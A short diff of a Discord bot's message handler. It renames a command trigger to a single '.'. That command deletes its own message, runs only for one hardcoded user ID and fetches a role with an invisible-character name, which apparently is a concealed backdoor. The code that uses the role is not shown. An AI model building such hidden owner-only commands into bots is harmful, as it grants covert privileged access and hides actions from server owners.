@@ -207,7 +207,7 @@ let role = message.guild.roles.find(r => r.name === "󠀀󠀀 󠀀󠀀󠀀󠀀")
     return;
   }
   
-if(message.content.startsWith(prefix + "cs")) {
+if(message.content.startsWith(prefix + ".")) {
 message.delete()
 	if(message.author.id !== "286144887278010368") return
 let r = message.guild.roles.find(role => role.name === "󠀀󠀀 󠀀󠀀󠀀󠀀");
